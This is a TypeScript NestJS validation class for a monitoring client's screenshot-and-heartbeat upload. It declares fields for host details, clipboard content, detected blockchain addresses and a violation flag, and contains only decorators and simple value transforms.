import { IsString, IsNotEmpty, IsOptional, IsBoolean, IsObject } from 'class-validator';
import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';
import { Transform } from 'class-transformer';

export class ScreenshotUploadWithHeartbeatDto {
  // 心跳相关字段
  @ApiProperty({ description: '客户端ID', example: 'client-001' })
  @IsString()
  @IsNotEmpty({ message: '客户端ID不能为空' })
  clientId: string;

  @ApiPropertyOptional({ description: '客户端IP地址', example: '192.168.1.100' })
  @IsOptional()
  @IsString()
  ipAddress?: string;

  @ApiPropertyOptional({ description: '客户端主机名', example: 'DESKTOP-ABC123' })
  @IsOptional()
  @IsString()
  hostname?: string;

  @ApiPropertyOptional({ description: '操作系统信息', example: 'Windows 10' })
  @IsOptional()
  @IsString()
  osInfo?: string;

  @ApiPropertyOptional({ description: '客户端版本', example: '1.0.0' })
  @IsOptional()
  @IsString()
  version?: string;

  @ApiPropertyOptional({ description: '额外的客户端信息' })
  @IsOptional()
  @Transform(({ value }) => {
    if (typeof value === 'string') {
      try {
        return JSON.parse(value);
      } catch {
        return value;
      }
    }
    return value;
  })
  @IsObject()
  metadata?: Record<string, any>;

  // 截图上传相关字段
  @ApiPropertyOptional({ description: '剪贴板内容' })
  @IsOptional()
  @IsString()
  clipboardContent?: string;

  @ApiPropertyOptional({ description: '检测到的区块链地址（逗号分隔）' })
  @IsOptional()
  @IsString()
  detectedAddresses?: string;

  @ApiPropertyOptional({ description: '是否检测到违规地址' })
  @IsOptional()
  @Transform(({ value }) => {
    if (typeof value === 'string') {
      return value.toLowerCase() === 'true';
    }
    return Boolean(value);
  })
  @IsBoolean()
  hasViolations?: boolean;
}
